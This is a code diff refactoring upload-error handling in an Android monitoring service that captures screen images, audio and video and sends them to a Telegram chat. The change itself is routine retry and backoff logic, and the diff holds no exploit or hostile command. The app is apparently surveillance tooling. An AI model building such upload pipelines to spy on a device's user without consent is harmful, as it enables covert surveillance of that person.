@@ -5566,7 +5566,7 @@ class MonitoringService : Service() {
                     if (reportResult) {
                         sendToTelegram("⚠️ Izin tangkap layar dicabut. Buka Setup, tekan Capture Screen untuk memberikannya lagi.")
                     } else {
-                        notifyPhotoSendFailure("izin tangkap layar dicabut")
+                        notifyMediaSendFailure("foto", "izin tangkap layar dicabut")
                     }
                     return@launch
                 }
@@ -5919,16 +5919,74 @@ class MonitoringService : Service() {
         }
     }
 
-    private suspend fun notifyPhotoSendFailure(detail: String) {
+    private suspend fun notifyMediaSendFailure(jenis: String, detail: String) {
         try {
             val now = System.currentTimeMillis()
             val last = preferencesManager.lastUploadErrorNotice
             if (last > 0 && now >= last && now - last < 30 * 60_000L) return
             preferencesManager.lastUploadErrorNotice = now
-            sendToTelegram("⚠️ Unggah foto gagal ($detail). Akan dicoba otomatis.")
+            sendToTelegram("⚠️ Unggah $jenis gagal ($detail). Akan dicoba otomatis.")
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "Error sending upload notice: ${redactToken(e.message)}")
         }
+    }
+
+    private fun mediaRateLimitBackoff(errorFull: String, label: String): MediaSendOutcome {
+        val waitSecs = NetworkUtils.parseRetryAfter(errorFull).coerceIn(1L, 3600L)
+        mediaBackoffUntil = android.os.SystemClock.elapsedRealtime() + waitSecs * 1000L
+        NetworkUtils.noteRateLimited(waitSecs)
+        android.util.Log.w("MonitoringService", "$label rate limited, backing off ${waitSecs}s without blocking")
+        try {
+            MessageScheduler.scheduleRateLimited(this, waitSecs * 1000L)
+        } catch (_: Exception) {
+        }
+        return MediaSendOutcome.KEPT
+    }
+
+    private suspend fun classifyMediaRejection(
+        file: File,
+        code: Int,
+        errorFull: String,
+        chatId: String,
+        label: String,
+        jenis: String
+    ): MediaSendOutcome {
+        if (code == 401 || code == 403) {
+            android.util.Log.e("MonitoringService", "$label auth rejected ($code), keeping file for retry")
+            try {
+                preferencesManager.credentialError = code.toString()
+                preferencesManager.credentialErrorAt = System.currentTimeMillis()
+            } catch (_: Exception) {
+            }
+            return MediaSendOutcome.KEPT
+        }
+        if (code == 400) {
+            if (adoptMigratedChat(errorFull, chatId)) return MediaSendOutcome.KEPT
+            if (NetworkUtils.isChatMissing(errorFull)) {
+                try {
+                    preferencesManager.credentialError = code.toString()
+                    preferencesManager.credentialErrorAt = System.currentTimeMillis()
+                } catch (_: Exception) {
+                }
+                return MediaSendOutcome.KEPT
+            }
+            if (NetworkUtils.isRightsLimited(errorFull)) {
+                android.util.Log.w("MonitoringService", "$label rights limited (400), keeping file without auth block")
+                return MediaSendOutcome.KEPT
+            }
+            android.util.Log.w("MonitoringService", "$label rejected (400), dropping file")
+            deleteQuietly(file)
+            return MediaSendOutcome.DROPPED
+        }
+        if (code == 413) {
+            android.util.Log.w("MonitoringService", "$label too large (413), dropping file")
+            deleteQuietly(file)
+            return MediaSendOutcome.DROPPED
+        }
+        val errorBody = errorFull.take(200)
+        android.util.Log.e("MonitoringService", "✗ Failed to send ${label.lowercase()}: $code $errorBody")
+        notifyMediaSendFailure(jenis, "HTTP $code $errorBody".trim())
+        return MediaSendOutcome.KEPT
     }
 
     private fun baseForegroundType(): Int {
@@ -6561,53 +6619,17 @@ class MonitoringService : Service() {
                 deleteQuietly(audioFile)
                 return MediaSendOutcome.SENT
             }
-            if (response.code() == 429) {
-                val waitSecs = NetworkUtils.parseRetryAfter(try { response.errorBody()?.string() } catch (_: Exception) { null }).coerceIn(1L, 3600L)
-                mediaBackoffUntil = android.os.SystemClock.elapsedRealtime() + waitSecs * 1000L
-                NetworkUtils.noteRateLimited(waitSecs)
-                try {
-                    MessageScheduler.scheduleRateLimited(this, waitSecs * 1000L)
-                } catch (_: Exception) {
-                }
-                return MediaSendOutcome.KEPT
+            val errorFull = try {
+                response.errorBody()?.string() ?: ""
+            } catch (_: Exception) {
+                ""
             }
-            if (response.code() == 401 || response.code() == 403) {
-                try {
-                    preferencesManager.credentialError = response.code().toString()
-                    preferencesManager.credentialErrorAt = System.currentTimeMillis()
-                } catch (_: Exception) {
-                }
-            } else if (response.code() == 400) {
-                val audioErr = try {
-                    response.errorBody()?.string()
-                } catch (_: Exception) {
-                    null
-                }
-                if (adoptMigratedChat(audioErr, chatId)) return MediaSendOutcome.KEPT
-                if (NetworkUtils.isChatMissing(audioErr)) {
-                    try {
-                        preferencesManager.credentialError = response.code().toString()
-                        preferencesManager.credentialErrorAt = System.currentTimeMillis()
-                    } catch (_: Exception) {
-                    }
-                    return MediaSendOutcome.KEPT
-                }
-                if (NetworkUtils.isRightsLimited(audioErr)) {
-                    android.util.Log.w("MonitoringService", "Audio rights limited (400), keeping file without auth block")
-                    return MediaSendOutcome.KEPT
-                }
-                android.util.Log.w("MonitoringService", "Audio rejected (400), dropping file")
-                deleteQuietly(audioFile)
-                return MediaSendOutcome.DROPPED
-            } else if (response.code() == 413) {
-                android.util.Log.w("MonitoringService", "Audio too large (413), dropping file")
-                deleteQuietly(audioFile)
-                return MediaSendOutcome.DROPPED
-            }
-            return MediaSendOutcome.KEPT
+            if (response.code() == 429) return mediaRateLimitBackoff(errorFull, "Audio")
+            return classifyMediaRejection(audioFile, response.code(), errorFull, chatId, "Audio", "audio")
         } catch (e: kotlinx.coroutines.CancellationException) {
             throw e
         } catch (e: Exception) {
+            android.util.Log.e("MonitoringService", "✗ Error sending audio to Telegram: ${redactToken(e.message)}")
             return MediaSendOutcome.KEPT
         }
     }
@@ -6782,46 +6804,8 @@ class MonitoringService : Service() {
             } catch (e: Exception) {
                 ""
             }
-            if (response.code() == 429) {
-                val waitSecs = NetworkUtils.parseRetryAfter(errorFull).coerceIn(1L, 3600L)
-                mediaBackoffUntil = android.os.SystemClock.elapsedRealtime() + waitSecs * 1000L
-                NetworkUtils.noteRateLimited(waitSecs)
-                android.util.Log.w("MonitoringService", "Video rate limited, backing off ${waitSecs}s without blocking")
-                try {
-                    MessageScheduler.scheduleRateLimited(this, waitSecs * 1000L)
-                } catch (_: Exception) {
-                }
-                return MediaSendOutcome.KEPT
-            }
-            if (response.code() == 401 || response.code() == 403) {
-                try {
-                    preferencesManager.credentialError = response.code().toString()
-                    preferencesManager.credentialErrorAt = System.currentTimeMillis()
-                } catch (_: Exception) {
-                }
-            } else if (response.code() == 400) {
-                if (adoptMigratedChat(errorFull, chatId)) return MediaSendOutcome.KEPT
-                if (NetworkUtils.isChatMissing(errorFull)) {
-                    try {
-                        preferencesManager.credentialError = response.code().toString()
-                        preferencesManager.credentialErrorAt = System.currentTimeMillis()
-                    } catch (_: Exception) {
-                    }
-                    return MediaSendOutcome.KEPT
-                }
-                if (NetworkUtils.isRightsLimited(errorFull)) {
-                    android.util.Log.w("MonitoringService", "Video rights limited (400), keeping file without auth block")
-                    return MediaSendOutcome.KEPT
-                }
-                android.util.Log.w("MonitoringService", "Video rejected (400), dropping file")
-                deleteQuietly(videoFile)
-                return MediaSendOutcome.DROPPED
-                } else if (response.code() == 413) {
-                android.util.Log.w("MonitoringService", "Video too large (413), dropping file")
-                deleteQuietly(videoFile)
-                return MediaSendOutcome.DROPPED
-                }
-                return MediaSendOutcome.KEPT
+            if (response.code() == 429) return mediaRateLimitBackoff(errorFull, "Video")
+            return classifyMediaRejection(videoFile, response.code(), errorFull, chatId, "Video", "video")
         } catch (e: kotlinx.coroutines.CancellationException) {
             throw e
         } catch (e: Exception) {
@@ -7168,50 +7152,8 @@ class MonitoringService : Service() {
             } catch (e: Exception) {
                 ""
             }
-            val errorBody = errorFull.take(200)
-            if (response.code() == 429) {
-                val waitSecs = NetworkUtils.parseRetryAfter(errorFull).coerceIn(1L, 3600L)
-                mediaBackoffUntil = android.os.SystemClock.elapsedRealtime() + waitSecs * 1000L
-                NetworkUtils.noteRateLimited(waitSecs)
-                android.util.Log.w("MonitoringService", "Photo rate limited, backing off ${waitSecs}s without blocking")
-                try {
-                    MessageScheduler.scheduleRateLimited(this, waitSecs * 1000L)
-                } catch (_: Exception) {
-                }
-                return MediaSendOutcome.KEPT
-            } else if (response.code() == 401 || response.code() == 403) {
-                android.util.Log.e("MonitoringService", "Photo auth rejected (${response.code()}), keeping file for retry")
-                try {
-                    preferencesManager.credentialError = response.code().toString()
-                    preferencesManager.credentialErrorAt = System.currentTimeMillis()
-                } catch (_: Exception) {
-                }
-            } else if (response.code() == 400) {
-                if (adoptMigratedChat(errorFull, chatId)) return MediaSendOutcome.KEPT
-                if (NetworkUtils.isChatMissing(errorFull)) {
-                    try {
-                        preferencesManager.credentialError = response.code().toString()
-                        preferencesManager.credentialErrorAt = System.currentTimeMillis()
-                    } catch (_: Exception) {
-                    }
-                    return MediaSendOutcome.KEPT
-                }
-                if (NetworkUtils.isRightsLimited(errorFull)) {
-                    android.util.Log.w("MonitoringService", "Photo rights limited (400), keeping file without auth block")
-                    return MediaSendOutcome.KEPT
-                }
-                android.util.Log.w("MonitoringService", "Photo rejected (400), dropping file")
-                deleteQuietly(photoFile)
-                return MediaSendOutcome.DROPPED
-            } else if (response.code() == 413) {
-                android.util.Log.w("MonitoringService", "Photo too large (413), dropping file")
-                deleteQuietly(photoFile)
-                return MediaSendOutcome.DROPPED
-            } else {
-                android.util.Log.e("MonitoringService", "✗ Failed to send photo: ${response.code()} $errorBody")
-                notifyPhotoSendFailure("HTTP ${response.code()} $errorBody".trim())
-            }
-            return MediaSendOutcome.KEPT
+            if (response.code() == 429) return mediaRateLimitBackoff(errorFull, "Photo")
+            return classifyMediaRejection(photoFile, response.code(), errorFull, chatId, "Photo", "foto")
         } catch (e: kotlinx.coroutines.CancellationException) {
             throw e
         } catch (e: Exception) {
